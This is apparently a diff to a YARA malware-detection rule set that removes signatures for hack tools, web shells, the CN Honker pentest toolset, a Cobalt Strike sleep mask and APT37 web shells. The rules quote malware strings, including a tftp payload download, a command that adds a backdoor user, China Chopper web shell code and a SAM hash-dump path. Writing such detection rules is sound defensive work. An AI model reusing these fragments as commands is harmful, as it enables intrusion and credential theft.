       filesize < 4000KB and
       1 of them
-}
-
-rule SUSP_Base64_Encoded_Hacktool_Dev {
-   meta:
-      description = "Detects a suspicious base64 encoded keyword"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://twitter.com/cyb3rops/status/1270626274826911744"
-      date = "2020-06-10"
-      score = 65
-      id = "6dc7db4b-a614-51e4-a9a5-f869154dbbb1"
-   strings:
-      $ = "QGdlbnRpbGtpd2" ascii wide 
-      $ = "BnZW50aWxraXdp" ascii wide 
-      $ = "AZ2VudGlsa2l3a" ascii wide
-      $ = "QGhhcm1qMH" ascii wide
-      $ = "BoYXJtajB5" ascii wide
-      $ = "AaGFybWowe" ascii wide
-      $ = "IEBzdWJ0ZW" ascii wide
-      $ = "BAc3VidGVl" ascii wide
-      $ = "gQHN1YnRlZ" ascii wide
-   condition:
-      filesize < 6000KB and 1 of them
 }
 
 rule SUSP_Qakbot_Uninstaller_ShellCode_Aug23 {
@@ -30952,28 +27280,6 @@ rule WindosShell_s1 {
 		$s8 = "[ %c%c requires parameter" fullword ascii
 	condition:
 		( uint16(0) == 0x5a4d and filesize < 150KB and 2 of them ) or ( 5 of them )
-}
-
-rule WindowsShell_s4 {
-	meta:
-		description = "Detects simple Windows shell - file s4.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "https://github.com/odzhan/shells/"
-		date = "2016-03-26"
-		hash = "f00a1af494067b275407c449b11dfcf5cb9b59a6fac685ebd3f0eb193337e1d6"
-		id = "838771dc-f885-5332-9813-2bc01af8e5fe"
-	strings:
-		$s1 = "cmd                  - execute cmd.exe" fullword ascii
-		$s2 = "\\\\.\\pipe\\%08X" fullword ascii
-		$s3 = "get <remote> <local> - download file" fullword ascii
-		$s4 = "[ simple remote shell for windows v4" fullword ascii
-		$s5 = "REMOTE: CreateFile(\"%s\")" fullword ascii
-		$s6 = "[ downloading \"%s\" to \"%s\"" fullword ascii
-		$s7 = "[ uploading \"%s\" to \"%s\"" fullword ascii
-		$s8 = "-l           Listen for incoming connections" fullword ascii
-	condition:
-		( uint16(0) == 0x5a4d and filesize < 175KB and 2 of them ) or ( 5 of them )
 }
 
 rule WindowsShell_Gen {
@@ -31318,576 +27624,6 @@ rule CN_Honker_Alien_iispwd {
 		$s1 = "wscript.echo \"from : http://www.xxx.com/\" &vbTab&vbCrLf" fullword ascii /* PEStudio Blacklist: strings */
 	condition:
 		filesize < 3KB and all of them
-}
-
-rule CN_Honker_D_injection_V2_32 {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file D_injection_V2.32.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "3a000b976c79585f62f40f7999ef9bdd326a9513"
-		id = "4c661c35-61ee-5ee7-9b8e-9908fbe0362b"
-	strings:
-		$s0 = "Missing %s property(CommandText does not return a result set{Error creating obje" wide /* PEStudio Blacklist: strings */
-		$s1 = "/tftp -i 219.134.46.245 get 9493.exe c:\\9394.exe" fullword ascii
-	condition:
-		uint16(0) == 0x5a4d and filesize < 5000KB and all of them
-}
-
-rule CN_Honker_net_priv_esc2 {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file net-priv-esc2.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "4851e0088ad38ac5b3b1c75302a73698437f7f17"
-		id = "b4fa3129-57a3-55ee-8ca6-ecbcc135184e"
-	strings:
-		$s1 = "Usage:%s username password" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "<www.darkst.com>" fullword ascii
-	condition:
-		uint16(0) == 0x5a4d and filesize < 17KB and all of them
-}
-
-rule CN_Honker_Oracle_v1_0_Oracle {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file Oracle.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "0264f4efdba09eaf1e681220ba96de8498ab3580"
-		id = "0cebede9-f4ff-5efb-98bc-55df0ad656a3"
-	strings:
-		$s1 = "!http://localhost/index.asp?id=zhr" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "OnGetPassword" fullword ascii /* PEStudio Blacklist: strings */
-		$s3 = "Mozilla/3.0 (compatible; Indy Library)" fullword ascii /* PEStudio Blacklist: strings */
-	condition:
-		uint16(0) == 0x5a4d and filesize < 3455KB and all of them
-}
-
-rule CN_Honker_Interception {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file Interception.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "ea813aed322e210ea6ae42b73b1250408bf40e7a"
-		id = "40d350e5-c6af-58e2-a1d8-f9516af5f869"
-	strings:
-		$s2 = ".\\dat\\Hookmsgina.dll" fullword ascii /* PEStudio Blacklist: strings */
-		$s5 = "WinlogonHackEx " fullword wide /* PEStudio Blacklist: strings */
-	condition:
-		uint16(0) == 0x5a4d and filesize < 160KB and all of them
-}
-
-rule CN_Honker_sig_3389_DUBrute_v3_0_RC3_3_0 {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file 3.0.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "49b311add0940cf183e3c7f3a41ea6e516bf8992"
-		id = "994ad7e9-2019-54b3-84e6-2762a700c939"
-	strings:
-		$s0 = "explorer.exe http://bbs.yesmybi.net" fullword ascii /* PEStudio Blacklist: strings */
-		$s1 = "LOADER ERROR" fullword ascii /* PEStudio Blacklist: strings */
-		$s9 = "CryptGenRandom" fullword ascii /* PEStudio Blacklist: strings */ /* Goodware String - occured 581 times */
-	condition:
-		uint16(0) == 0x5a4d and filesize < 395KB and all of them
-}
-
-rule CN_Honker_windows_exp {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file exp.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "04334c396b165db6e18e9b76094991d681e6c993"
-		id = "148900d0-cf62-5cb0-adbc-52fa8ce8832e"
-	strings:
-		$s0 = "c:\\windows\\system32\\command.com /c " fullword ascii /* PEStudio Blacklist: strings */
-		$s8 = "OH,Sry.Too long command." fullword ascii /* PEStudio Blacklist: strings */
-	condition:
-		uint16(0) == 0x5a4d and filesize < 220KB and all of them
-}
-
-rule CN_Honker_safe3wvs_cgiscan {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file cgiscan.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "f94bbf2034ad9afa43cca3e3a20f142e0bb54d75"
-		id = "a9f7a195-deb8-5887-bc55-d1b0cac43182"
-	strings:
-		$s2 = "httpclient.exe" fullword wide
-		$s3 = "www.safe3.com.cn" fullword wide
-	condition:
-		uint16(0) == 0x5a4d and filesize < 357KB and all of them
-}
-
-rule CN_Honker_pr_debug {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file debug.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "d11e6c6f675b3be86e37e50184dadf0081506a89"
-		id = "6d759818-b762-56f4-8475-82a7d18a659c"
-	strings:
-		$s1 = "-->Got WMI process Pid: %d " ascii /* PEStudio Blacklist: strings */
-		$s2 = "This exploit will execute \"net user temp 123456 /add & net localg" ascii /* PEStudio Blacklist: strings */
-	condition:
-		uint16(0) == 0x5a4d and filesize < 820KB and all of them
-}
-
-rule CN_Honker_T00ls_Lpk_Sethc_v4_0 {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file T00ls Lpk Sethc v4.0.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "98f21f72c761e504814f0a7db835a24a2413a6c2"
-		id = "d41cbed5-a6e3-5165-a8c3-e0375c1ed75d"
-	strings:
-		$s0 = "LOADER ERROR" fullword ascii /* PEStudio Blacklist: strings */
-		$s15 = "2011-2012 T00LS&RICES" fullword wide
-	condition:
-		uint16(0) == 0x5a4d and filesize < 2077KB and all of them
-}
-
-rule CN_Honker_MatriXay1073 {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file MatriXay1073.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		modified = "2023-01-27"
-		score = 70
-		hash = "fef951e47524f827c7698f4508ba9551359578a5"
-		id = "23e73b89-f60e-5bc3-8974-15be16d7c408"
-	strings:
-		$s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1" ascii /* PEStudio Blacklist: strings */
-		$s1 = "Policy\\Scan\\GetUserLen.ini" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "!YEL!Using http://127.0.0.1:%d/ to visiter https://%s:%d/" ascii /* PEStudio Blacklist: strings */
-		$s3 = "getalluserpasswordhash" fullword ascii /* PEStudio Blacklist: strings */
-	condition:
-		uint16(0) == 0x5a4d and filesize < 9100KB and all of them
-}
-
-rule CN_Honker_Sword1_5 {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file Sword1.5.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "96ee5c98e982aa8ed92cb4cedb85c7fda873740f"
-		id = "832e4998-64fc-5f34-a46d-aeefde0ee763"
-	strings:
-		$s1 = "http://www.md5.com.cn" fullword wide
-		$s2 = "ListBox_Command" fullword wide /* PEStudio Blacklist: strings */
-		$s3 = "\\Set.ini" wide
-		$s4 = "OpenFileDialog1" fullword wide
-	condition:
-		uint16(0) == 0x5a4d and filesize < 740KB and all of them
-}
-
-rule CN_Honker_Havij_Havij {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file Havij.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "0d8b275bd1856bc6563dd731956f3b312e1533cd"
-		id = "b3640a32-b546-58c9-abb1-3da60dc6633c"
-	strings:
-		$s1 = "User-Agent: %Inject_Here%" fullword wide /* PEStudio Blacklist: strings */
-		$s2 = "BACKUP database master to disk='d:\\Inetpub\\wwwroot\\1.zip'" fullword ascii /* PEStudio Blacklist: strings */
-	condition:
-		uint16(0) == 0x5a4d and filesize < 3000KB and all of them
-}
-
-rule CN_Honker_exp_ms11011 {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file ms11011.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "5ad7a4962acbb6b0e3b73d77385eb91feb88b386"
-		id = "fc092166-73cd-58f6-b034-a2fe2c5fb859"
-	strings:
-		$s0 = "\\i386\\Hello.pdb" ascii /* PEStudio Blacklist: strings */
-		$s1 = "OS not supported." fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = ".Rich5" fullword ascii
-		$s3 = "Not supported." fullword wide /* PEStudio Blacklist: strings */ /* Goodware String - occured 3 times */
-		$s5 = "cmd.exe" fullword ascii /* PEStudio Blacklist: strings */ /* Goodware String - occured 120 times */
-	condition:
-		uint16(0) == 0x5a4d and filesize < 100KB and all of them
-}
-
-rule CN_Honker_DLL_passive_privilege_escalation_ws2help {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file ws2help.dll"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "e539b799c18d519efae6343cff362dcfd8f57f69"
-		id = "85a07bb7-2856-56f0-bd15-e020bb2a7692"
-	strings:
-		$s0 = "PassMinDll.dll" fullword ascii
-		$s1 = "\\ws2help.dll" ascii
-	condition:
-		uint16(0) == 0x5a4d and filesize < 30KB and all of them
-}
-
-rule CN_Honker_Webshell {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file Webshell.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "c85bd09d241c2a75b4e4301091aa11ddd5ad6d59"
-		id = "12870766-2b85-522d-9ad8-abba2786caaf"
-	strings:
-		$s1 = "Windows NT users: Please note that having the WinIce/SoftIce" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "Do you want to cancel the file download?" fullword ascii /* PEStudio Blacklist: strings */
-		$s3 = "Downloading: %s" fullword ascii /* PEStudio Blacklist: strings */
-	condition:
-		uint16(0) == 0x5a4d and filesize < 381KB and all of them
-}
-
-rule CN_Honker_AspxClient {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file AspxClient.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		modified = "2022-12-21"
-		score = 70
-		hash = "67569a89128f503a459eab3daa2032261507f2d2"
-		id = "7e38365c-ffe5-5fcd-8bd6-948d255d6e10"
-	strings:
-		$s1 = "\\tools\\hashq\\hashq.exe" wide
-		$s2 = "\\Release\\CnCerT.CCdoor.Client.pdb" ascii
-		$s3 = "\\myshell.mdb" wide /* PEStudio Blacklist: strings */
-		$s4 = "injectfile" fullword wide /* PEStudio Blacklist: strings */
-	condition:
-		uint16(0) == 0x5a4d and filesize < 1000KB and 3 of them
-}
-
-rule CN_Honker_Fckeditor {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file Fckeditor.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "4b16ae12c204f64265acef872526b27111b68820"
-		id = "eb8767cb-b081-5c37-b7ad-57a0de047462"
-	strings:
-		$s0 = "explorer.exe http://user.qzone.qq.com/568148075" fullword wide /* PEStudio Blacklist: strings */
-		$s7 = "Fckeditor.exe" fullword wide /* PEStudio Blacklist: strings */
-	condition:
-		uint16(0) == 0x5a4d and filesize < 1340KB and all of them
-}
-
-rule CN_Honker_Codeeer_Explorer {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file Codeeer Explorer.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "f32e05f3fefbaa2791dd750e4a3812581ce0f205"
-		id = "d4a88ae7-c0b2-57d2-a070-3dd748a30a3a"
-	strings:
-		$s2 = "Codeeer Explorer.exe" fullword wide /* PEStudio Blacklist: strings */
-		$s12 = "webBrowser1_ProgressChanged" fullword ascii /* PEStudio Blacklist: strings */
-	condition:
-		uint16(0) == 0x5a4d and filesize < 470KB and all of them
-}
-
-rule CN_Honker_SwordHonkerEdition {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file SwordHonkerEdition.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "3f9479151c2cada04febea45c2edcf5cece1df6c"
-		id = "5688fa03-bcb0-545d-9fdf-7ab48a389424"
-	strings:
-		$s0 = "\\bin\\systemini\\MyPort.ini" wide /* PEStudio Blacklist: strings */
-		$s1 = "PortThread=200 //" fullword wide /* PEStudio Blacklist: strings */
-		$s2 = " Port Open -> " fullword wide /* PEStudio Blacklist: strings */
-	condition:
-		uint16(0) == 0x5a4d and filesize < 375KB and all of them
-}
-
-rule CN_Honker_HASH_PwDump7 {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file PwDump7.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "93a2d7c3a9b83371d96a575c15fe6fce6f9d50d3"
-		id = "d61a1ac3-7c8a-5de2-a5a8-2a043b73f3b3"
-	strings:
-		$s1 = "%s\\SYSTEM32\\CONFIG\\SAM" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "No Users key!" fullword ascii /* PEStudio Blacklist: strings */
-		$s3 = "NO PASSWORD*********************:" fullword ascii /* PEStudio Blacklist: strings */
-		$s4 = "Unable to dump file %S" fullword ascii /* PEStudio Blacklist: strings */
-	condition:
-		uint16(0) == 0x5a4d and filesize < 380KB and all of them
-}
-
-rule CN_Honker_ChinaChopper {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file ChinaChopper.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "fa347fdb23ab0b8d0560a0d20c434549d78e99b5"
-		id = "9f7fbaac-65b5-5162-87d1-96ccd9711adb"
-	strings:
-		$s1 = "$m=get_magic_quotes_gpc();$sid=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$u" wide /* PEStudio Blacklist: strings */
-		$s3 = "SETP c:\\windows\\system32\\cmd.exe " fullword wide /* PEStudio Blacklist: strings */
-		$s4 = "Ev al (\"Exe cute(\"\"On+Error+Resume+Next:%s:Response.Write(\"\"\"\"->|\"\"\"\"" wide /* PEStudio Blacklist: strings */
-	condition:
-		uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them
-}
-
-rule CN_Honker_dedecms5_7 {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file dedecms5.7.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "f9cbb25883828ca266e32ff4faf62f5a9f92c5fb"
-		id = "b037862d-2821-5e96-996b-13ab241575ba"
-	strings:
-		$s1 = "/data/admin/ver.txt" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "SkinH_EL.dll" fullword ascii
-	condition:
-		uint16(0) == 0x5a4d and filesize < 830KB and all of them
-}
-
-rule CN_Honker_Alien_ee {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file ee.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "15a7211154ee7aca29529bd5c2500e0d33d7f0b3"
-		id = "03540f82-6662-55e3-97f8-38776271f08b"
-	strings:
-		$s1 = "GetIIS UserName and PassWord." fullword wide /* PEStudio Blacklist: strings */
-		$s2 = "Read IIS ID For FreeHost." fullword wide /* PEStudio Blacklist: strings */
-	condition:
-		uint16(0) == 0x5a4d and filesize < 50KB and all of them
-}
-
-rule CN_Honker_smsniff_smsniff {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file smsniff.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "8667a785a8ced76d0284d225be230b5f1546f140"
-		id = "fef242d5-b274-5217-a5d1-1a6ec38d0fdd"
-	strings:
-		$s1 = "smsniff.exe" fullword wide
-		$s5 = "SmartSniff" fullword wide
-	condition:
-		uint16(0) == 0x5a4d and filesize < 267KB and all of them
-}
-
-rule CN_Honker_Happy_Happy {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file Happy.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		modified = "2023-01-27"
-		score = 70
-		hash = "92067d8dad33177b5d6c853d4d0e897f2ee846b0"
-		id = "6e6c806d-e784-507f-b327-3b9f2510422b"
-	strings:
-		$s1 = "<form.*?method=\"post\"[\\s\\S]*?</form>" fullword wide /* PEStudio Blacklist: strings */
-		$s2 = "domainscan.exe" fullword wide /* PEStudio Blacklist: strings */
-		$s3 = "http://www.happysec.com/" wide
-		$s4 = "cmdshell" fullword ascii /* PEStudio Blacklist: strings */
-	condition:
-		uint16(0) == 0x5a4d and filesize < 655KB and 2 of them
-}
-
-rule CN_Honker_T00ls_Lpk_Sethc_v3_0 {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file T00ls Lpk Sethc v3.0.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "fa47c4affbac01ba5606c4862fdb77233c1ef656"
-		id = "7513a513-e8a3-58a8-8dd5-512ba33ff013"
-	strings:
-		$s1 = "http://127.0.0.1/1.exe" fullword wide /* PEStudio Blacklist: strings */
-		$s2 = ":Rices  Forum:T00Ls.Net  [4 Fucker Te@m]" fullword wide
-		$s3 = "SkinH_EL.dll" fullword wide
-	condition:
-		uint16(0) == 0x5a4d and filesize < 1000KB and 2 of them
-}
-
-rule CN_Honker_NetFuke_NetFuke {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file NetFuke.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "f89e223fd4f6f5a3c2a2ea225660ef0957fc07ba"
-		id = "833da5c7-e562-50e9-a2a9-54c36b0d1f61"
-	strings:
-		$s1 = "Mac Flood: Flooding %dT %d p/s " fullword ascii
-		$s2 = "netfuke_%s.txt" fullword ascii
-	condition:
-		uint16(0) == 0x5a4d and filesize < 1840KB and all of them
-}
-
-rule CN_Honker_ManualInjection {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file ManualInjection.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "e83d427f44783088a84e9c231c6816c214434526"
-		id = "f0899003-824f-56ed-b653-9f7a77b9ec6a"
-	strings:
-		$s0 = "http://127.0.0.1/cookie.asp?fuck=" fullword ascii /* PEStudio Blacklist: strings */
-		$s16 = "http://Www.cnhuker.com | http://www.0855.tv" fullword ascii
-	condition:
-		uint16(0) == 0x5a4d and filesize < 3000KB and all of them
-}
-
-rule CN_Honker_CnCerT_CCdoor_CMD {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file CnCerT.CCdoor.CMD.dll"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "1c6ed7d817fa8e6534a5fd36a94f4fc2f066c9cd"
-		id = "ddd328a8-7ad8-5b26-9deb-3e5da801cd1b"
-	strings:
-		$s2 = "CnCerT.CCdoor.CMD.dll" fullword wide
-		$s3 = "cmdpath" fullword ascii
-		$s4 = "Get4Bytes" fullword ascii
-		$s5 = "ExcuteCmd" fullword ascii
-	condition:
-		uint16(0) == 0x5a4d and filesize < 22KB and all of them
-}
-
-rule CN_Honker_termsrvhack {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file termsrvhack.dll"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "1c456520a7b7faf71900c71167038185f5a7d312"
-		id = "4fd582a1-3c6d-57a1-bba0-f775bb61ef00"
-	strings:
-		$s1 = "The terminal server cannot issue a client license.  It was unable to issue the" wide /* PEStudio Blacklist: strings */
-		$s6 = "%s\\%s\\%d\\%d" fullword wide
-	condition:
-		uint16(0) == 0x5a4d and filesize < 1052KB and all of them
-}
-
-rule CN_Honker_IIS6_iis6 {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file iis6.com"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "f0c9106d6d2eea686fd96622986b641968d0b864"
-		id = "f5d49cbd-1aec-5126-ab5d-83e485fa6869"
-	strings:
-		$s0 = "GetMod;ul" fullword ascii
-		$s1 = "excjpb" fullword ascii
-		$s2 = "LEAUT1" fullword ascii
-		$s3 = "EnumProcessModules" fullword ascii /* PEStudio Blacklist: strings */ /* Goodware String - occured 410 times */
-	condition:
-		uint16(0) == 0x5a4d and filesize < 50KB and all of them
-}
-
-rule CN_Honker_struts2_catbox {
-	meta:
-		description = "Sample from CN Honker Pentest Toolset - file catbox.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "ee8fbd91477e056aef34fce3ade474cafa1a4304"
-		id = "24df7a11-5ec4-5e7b-86f6-6195ca01b8f9"
-	strings:
-		$s6 = "'Toolmao box by gainover www.toolmao.com" fullword ascii
-		$s20 = "{external.exeScript(_toolmao_bgscript[i],'javascript',false);}}" fullword ascii /* PEStudio Blacklist: strings */
-	condition:
-		uint16(0) == 0x5a4d and filesize < 8160KB and all of them
 }
 
 rule CN_Honker_exp_ms11011 {
@@ -32310,20 +28046,6 @@ rule Molerats_Jul17_Sample_5 {
       $a2 = "gist.githubusercontent.com" nocase ascii
    condition:
       filesize < 200KB and ( 1 of ($x*) or 2 of them )
-}
-
-rule HKTL_CobaltStrike_SleepMask_Jul22 {
-   meta:
-      description = "Detects static bytes in Cobalt Strike 4.5 sleep mask function that are not obfuscated"
-      author = "CodeX"
-      date = "2022-07-04"
-      reference = "https://codex-7.gitbook.io/codexs-terminal-window/blue-team/detecting-cobalt-strike/sleep-mask-kit-iocs"
-      score = 80
-      id = "d396ab0e-b584-5a7c-8627-5f318a20f9dd"
-   strings:
-      $sleep_mask = { 48 8B C4 48 89 58 08 48 89 68 10 48 89 70 18 48 89 78 20 45 33 DB 45 33 D2 33 FF 33 F6 48 8B E9 BB 03 00 00 00 85 D2 0F 84 81 00 00 00 0F B6 45 }
-   condition:
-      $sleep_mask
 }
 
 rule xRAT_1 {
@@ -32810,31 +28532,6 @@ rule HvS_APT37_webshell_img_thumbs_asp {
       $g5 = "Option Explicit" fullword ascii
    condition:
       filesize < 2KB and (( 1 of ($s*) ) or (3 of ($a*)) or (5 of ($g*)))
-}
-
-rule HvS_APT37_webshell_template_query_asp {
-   meta:
-      description = "Webshell named template-query.aspimg.asp used by APT37"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Moritz Oettle"
-      date = "2020-12-15"
